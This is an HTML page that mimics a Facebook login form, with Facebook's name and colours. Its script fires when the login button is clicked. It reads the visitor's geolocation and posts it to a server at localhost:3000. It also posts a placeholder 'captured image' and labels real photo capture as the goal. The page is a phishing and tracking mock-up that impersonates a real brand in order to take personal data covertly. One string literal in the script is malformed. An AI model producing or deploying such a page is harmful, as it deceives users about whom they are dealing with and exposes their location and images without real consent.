<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Style Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            width: 400px;
            padding: 20px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
        }
        .container h1 {
            color: #1877f2;
            margin-bottom: 20px;
        }
        .container input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .container button {
            background-color: #1877f2;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .container button:hover {
            background-color: #145dbf;
        }
        .message {
            margin-top: 20px;
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Facebook</h1>
        <p>Login to access your account</p>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button id="loginBtn">Login</button>
        <div class="message" id="message"></div>
    </div>

    <script>
        // Capture location and image on login
        document.getElementById("loginBtn").addEventListener("click", () => {
            // Simulate login action
            document.getElementById("message").textContent = "Logging in...";

            // Get location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const { latitude, longitude } = position.coords;
                        console.log("Location:", latitude, longitude);
                        sendLocation(latitude, longitude);
                    },
                    error => {
                        console.error("Error getting location:", error);
                        document.getElementById("message").textContent = "Failed to retrieve location.";
                    }
                );
            } else {
                document.getElementById("message").textContent = "Geolocation is not supported by your browser.";
            }

            // Capture image (simulated, as browsers have limitations for auto-capture)
            const mockImage = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA\"; // Replace with real Base64 image
            sendImage(mockImage);
        });

        // Send location to the server
        function sendLocation(lat, long) {
            fetch("http://localhost:3000/location", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ latitude: lat, longitude: long }),
            })
                .then(response => response.text())
                .then(data => {
                    console.log("Server Response:", data);
                    document.getElementById("message").textContent = "Location sent successfully!";
                })
                .catch(err => {
                    console.error("Error sending location:", err);
                    document.getElementById("message").textContent = "Error sending location.";
                });
        }

        // Send image to the server
        function sendImage(imageBase64) {
            fetch("http://localhost:3000/upload", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ image: imageBase64 }),
            })
                .then(response => response.text())
                .then(data => {
                    console.log("Image uploaded:", data);
                    document.getElementById("message").textContent += " Image sent successfully!";
                })
                .catch(err => {
                    console.error("Error sending image:", err);
                    document.getElementById("message").textContent = "Error sending image.";
                });
        }
    </script>
</body>
</html>
